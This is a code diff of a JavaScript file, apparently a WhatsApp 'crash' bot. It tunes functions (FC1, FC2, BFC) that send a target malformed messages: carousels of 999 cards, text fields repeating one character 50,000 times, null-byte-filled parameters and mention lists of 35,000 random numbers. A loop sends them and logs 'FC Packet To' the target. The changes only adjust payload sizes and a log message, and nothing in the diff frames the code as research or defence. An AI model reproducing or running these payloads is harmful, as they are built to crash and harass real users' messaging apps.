@@ -968,7 +968,7 @@ async function FC1(sock, target) {
   for (let i = 0; i < 999; i++) { 
     cards.push({
       header: {
-        title: 'ꦾ'.repeat(60000),
+        title: 'ꦾ'.repeat(50000),
         imageMessage: {
           url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
           mimetype: "image/jpeg",
@@ -987,10 +987,10 @@ async function FC1(sock, target) {
         hasMediaAttachment: true
       },
       body: { 
-        text: "ꦾ".repeat(60000)
+        text: "ꦾ".repeat(50000)
       },
       footer: {
-        text: "ꦾ".repeat(60000)
+        text: "ꦾ".repeat(50000)
       },
       nativeFlowMessage: {
         messageParamsJson: "\u0000".repeat(9999),
@@ -1022,10 +1022,10 @@ async function FC1(sock, target) {
         },
         interactiveMessage: {
           body: { 
-            text: "ꦾ".repeat(60000)
+            text: "ꦾ".repeat(50000)
           },
           footer: { 
-            text: "ꦾ".repeat(60000)
+            text: "ꦾ".repeat(50000)
           },
           carouselMessage: {
             cards: cards 
@@ -1073,7 +1073,7 @@ async function FC2(sock, target) {
   const mentionedList = [
         "696969696969@s.whatsapp.net",
         ...Array.from({ length: 35000 }, () =>
-            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
+            `1${Math.floor(Math.random() * 5000)}@s.whatsapp.net`
         )
     ];
     
@@ -1369,7 +1369,7 @@ async function BFC(sock, target) {
         //await AB2(sock, target, true)
         await FC2(sock, target)
         await FC3(sock, target)
-        console.log(`${i} sikat Packet To ${target}`)
+        console.log(`${i} FC Packet To ${target}`)
     }
 
 }
